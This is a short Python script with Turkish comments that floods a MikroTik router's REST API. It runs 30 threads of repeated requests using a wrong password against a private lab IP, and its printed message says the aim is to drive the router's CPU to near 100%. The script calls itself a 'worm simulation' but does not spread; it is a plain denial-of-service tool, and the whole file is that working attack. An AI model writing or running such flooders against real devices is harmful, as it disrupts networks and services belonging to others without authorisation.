import requests
import threading
import time

hedef_ip = "192.168.56.101"
url = f"http://{hedef_ip}/rest/system/resource"

# Thread sayısını biraz düşürebiliriz, Session kullandığımız için daha etkili vuracaktır
thread_sayisi = 30 

def solucan_saldirisi():
    """Hedef cihaza sürekli ve hızlı istek göndererek CPU'yu yoran fonksiyon."""
    # requests.get yerine Session kullanıyoruz (Port israfını ve WinError 10048'i önler)
    session = requests.Session()
    session.auth = ('admin', 'yanlis_sifre')
    
    while True:
        try:
            # Oturum üzerinden istek atıyoruz
            session.get(url, timeout=1)
        except requests.exceptions.RequestException:
            # Bağlantı koparsa veya yavaşlarsa hatayı yoksay ve ufak bir es ver
            time.sleep(0.1)
            pass

print(f"⚠️ DİKKAT: {hedef_ip} adresine yönelik Worm Simülasyonu başlatılıyor...")
print("Bu işlem MikroTik CPU'sunu hızla %100'e yaklaştıracaktır.")
print("Durdurmak için CTRL+C tuşlarına basın.\n")

time.sleep(3)

# Multi-threading başlatma
threads = []
for i in range(thread_sayisi):
    t = threading.Thread(target=solucan_saldirisi)
    t.daemon = True
    threads.append(t)
    t.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nSimülasyon durduruldu.")